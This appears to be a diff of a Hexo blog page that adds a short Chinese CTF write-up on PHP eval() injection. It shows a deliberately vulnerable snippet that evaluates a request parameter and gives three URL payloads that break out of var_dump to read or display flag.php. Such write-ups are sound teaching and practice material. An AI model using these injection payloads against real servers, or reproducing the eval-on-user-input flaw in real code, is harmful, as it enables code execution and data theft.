@@ -15,7 +15,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>aaa |  Ymnnb</title>
+      <title> Ymnnb</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/1.ico" />
@@ -57,27 +57,67 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="page-"
-  class="article article-type-page"
+  id="post-eval一道简单题"
+  class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  aaa
-</h1>
- 
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/eval%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E9%A2%98/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.166Z" itemprop="datePublished">2024-07-29</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">270</span>
+        </span>
+    </span>
 
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">1 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
       
-    </header>
-       
+    <div class="tocbot"></div>
+
+
+
+
+  
     <div class="article-entry" itemprop="articleBody">
        
-   
+  <h1 id="PHP-eval-注入问题"><a href="#PHP-eval-注入问题" class="headerlink" title="PHP eval() 注入问题"></a>PHP eval() 注入问题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><p>• include()，引用文件，说明flag.php在同一文件夹下。</p>
+<p>• $_REQUEST[ ]等同于$_GET + $_POST，都可以用。</p>
+<p>• eval()能将字符串按PHP代码执行，这里是常用的的PHP注入点。（题眼在这里）</p>
+<p>• var_dump()显示表达式的类型和值，可以递归展开数组。</p>
+<p>• show_source()高亮文件，这里没啥用。</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">&quot;var_dump(a);print_r(file(&quot;</span>flag.php<span class="string">&quot;));    //     );&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>用GET方法传参构造注入:</p>
+<p>&#x2F;?hello&#x3D;1);print_r(file(“flag.php”));&#x2F;&#x2F;</p>
+<p>&#x2F;?hello&#x3D;1);闭合var_dump的括号</p>
+<p>file(“flag.php”)提取文件内容为字符数组（一行为一个字符串）</p>
+<p>print_r()逐行打印</p>
+<p>flag.php”));&#x2F;&#x2F;这后面的第二个括号是闭合eval的括号</p>
+<p>&#x2F;&#x2F;是为了注释后面的东西</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=file(&#x27;flag.php&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>file() 函数把整个文件读入一个数组中。(注意参数是字符串)</p>
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=1);show_source(%27flag.php%27);var_dump(</span><br></pre></td></tr></table></figure> 
       <!-- reward -->
       
     </div>
@@ -141,7 +181,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/aaa/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/07/29/eval%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E9%A2%98/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -150,9 +190,37 @@
   </div>
 
    
+  <nav class="article-nav">
+    
+      <a href="/2024/07/29/hybrid/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            (no title)
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/07/29/ensp%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title"></div>
+      </a>
+    
+  </nav>
+
   
    
   
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
 </article>
 
 </section>
@@ -283,6 +351,22 @@
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
 
 <script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
 <link
